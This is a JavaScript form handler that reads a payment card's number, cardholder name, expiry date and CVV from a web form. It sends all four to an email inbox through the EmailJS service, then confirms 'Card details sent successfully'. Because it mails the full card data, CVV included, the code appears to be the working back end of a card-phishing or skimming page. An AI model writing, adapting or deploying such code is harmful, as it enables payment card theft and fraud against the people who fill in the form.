function sendMail(event) {
    event.preventDefault(); // Prevent the form from submitting normally

    // Validation check (optional)
    const form = document.getElementById('cardForm');
    if (!form.checkValidity()) {
        form.classList.add('was-validated');
        return;
    }

    // Form data collection
    const params = {
        cardNumber: document.getElementById('cardNumber').value,
        cardName: document.getElementById('cardName').value,
        expiryDate: document.getElementById('expiryDate').value,
        cvv: document.getElementById('cvv').value,
    };

    const serviceID = "service_y2eoybe"; // Your Service ID
    const templateID = "template_ejj897f"; // Your Template ID

    emailjs.send(serviceID, templateID, params)
        .then((res) => {
            console.log("Email sent successfully:", res);

            // Clear input fields
            form.reset();

            // Display success message
            alert("Card details sent successfully !");
        })
        .catch((err) => {
            console.error('Failed to send email: ', err);
            alert("Error: Unable to send email. Please check the console.");
        });
}
